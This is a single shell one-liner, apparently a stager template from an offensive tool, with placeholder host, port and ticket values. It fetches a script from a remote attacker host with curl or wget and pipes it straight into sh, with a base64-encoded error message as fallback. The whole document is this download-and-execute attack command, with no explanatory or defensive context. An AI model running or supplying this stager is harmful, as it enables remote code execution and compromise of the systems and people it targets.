url="http://*LHOST*:*LPORT*/*TICKET*"; { curl -s $url || wget -q $url; } | sh 2>&1 || echo Q29tbWFuZDo6RXJyb3IK | base64 -d
